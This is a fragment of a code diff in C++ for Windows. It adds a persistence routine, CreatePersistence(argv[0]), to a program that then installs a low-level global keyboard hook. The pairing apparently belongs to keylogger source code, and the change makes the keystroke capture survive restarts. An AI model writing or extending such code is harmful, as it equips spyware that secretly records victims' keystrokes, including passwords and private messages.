@@ -15,6 +15,8 @@ int main(int argc, char* argv[])
 	{
 		std::cout << "Could not get file handle error: " << GetLastError() << std::endl;
 	}
+
+	CreatePersistence(argv[0]);
 	
     KeyboardHook = SetWindowsHookExA(
             WH_KEYBOARD_LL,
